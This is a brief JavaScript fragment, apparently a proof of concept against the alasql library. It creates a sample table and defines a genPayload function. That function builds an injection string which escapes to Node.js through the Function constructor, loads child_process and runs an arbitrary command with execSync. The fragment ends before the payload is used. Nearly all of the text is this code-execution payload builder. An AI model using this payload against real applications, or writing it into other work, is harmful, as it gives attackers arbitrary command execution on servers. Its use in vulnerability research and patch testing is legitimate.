alasql("CREATE table example1(a INT)");
alasql("INSERT INTO example1 VALUES (1337)");

const genPayload = command => `
new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
`;


